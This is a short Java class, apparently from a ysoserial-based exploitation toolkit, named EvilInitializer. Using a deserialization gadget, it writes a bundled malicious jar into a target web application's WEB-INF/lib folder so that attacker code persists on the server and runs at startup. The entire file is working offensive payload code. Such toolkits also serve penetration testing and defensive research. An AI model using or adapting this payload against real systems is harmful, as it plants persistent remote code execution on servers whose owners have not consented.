package ysoserial.payloads.persist;

import ysoserial.payloads.Eval;
import ysoserial.payloads.util.ReadWrite;

public class EvilInitializer {
    public Object getObject(Class gadget,String realPath) throws Exception {
        byte[] b = ReadWrite.readResource(EvilInitializer.class,"persist/evi_initializer.jar");
        String destination = realPath + "/WEB-INF/lib/evil_initializer.jar";
        return new Eval().uploadFile(gadget,b,destination);
    }
}
